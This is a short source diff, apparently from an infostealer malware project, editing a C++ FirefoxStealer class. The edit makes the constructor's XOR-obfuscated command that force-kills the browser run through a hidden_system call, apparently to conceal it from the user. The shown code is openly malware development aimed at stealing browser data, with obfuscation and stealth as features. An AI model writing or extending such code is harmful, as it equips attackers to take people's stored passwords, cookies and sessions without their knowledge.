@@ -9,7 +9,7 @@
 
 class FirefoxStealer : public AbstractStealer {
 public:
-  FirefoxStealer(std::string executable, std::filesystem::path path) : path(path) { system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str()); }
+  FirefoxStealer(std::string executable, std::filesystem::path path) : path(path) { hidden_system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str()); }
 
   inline void steal() override {
     PRINTF("FirefoxStealer::steal()\n");
